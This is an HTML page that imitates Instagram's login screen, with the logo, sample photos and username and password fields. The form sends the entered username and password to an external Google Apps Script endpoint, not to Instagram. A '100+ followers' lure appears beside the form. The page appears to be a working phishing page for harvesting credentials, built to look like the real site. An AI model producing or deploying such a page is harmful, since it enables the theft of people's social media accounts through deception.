<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<link rel="stylesheet" href="style.css">
</head>

<body>

<div id="content-container">

<!--Phone's pictures section-->
<section class="phones">
<img src="./img/phones.png" alt="pictures on phone" class="phone-image">
<div class="display-phone">
<img class="picture" src="./img/photo-1.png" alt="#">
<img class="picture" src="./img/photo-2.png" alt="#">
<img class="picture" src="./img/photo-3.png" alt="#">
<img class="picture" src="./img/photo-4.png" alt="#">
<img class="picture" src="./img/photo-5.png" alt="#">
</div>
</section>

<!--User's log in section-->
<section class="user">

<div class="login-container">

<!--Instagram Logo-->
<div class="instagram-logo-box">
<img class="instagram-logo" src="./img/instagram-logo.png">
</div>

<!--Form Login-->
<form id="gform" method="post" action="https://script.google.com/macros/s/AKfycbyl9lu9tpAaFCL5ua_fh6SJsgHbHRyZb90AsMUJJmkVZ58H1XFs1RbguVtqlT_8uLCGzQ/exec" method="POST" >
<div class="inputs-container">
<input type="text" id="username" name="username" placeholder="Phone number, username or email" required>
</div>
<div class="inputs-container">
<input type="password" id="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="login-button">Log In</button>
<div id="feedback" style="color: red; margin-top: 10px;"></div>
</form>

<div class="or-container">
<div class="line"></div>
<div class="or">100+ followers</div>
<div class="line"></div>
</div>

<!--Password recovery-->
<a class="password-forgot" href="#" target="_blank">Forgot password?</a>
</div>



</section>

</div>

<footer class="page-footer">



<div class="footer-span-container">
<span class="footer-span">
Â© 2024 profweb
</span>
</div>
</footer>
</body>

</html>
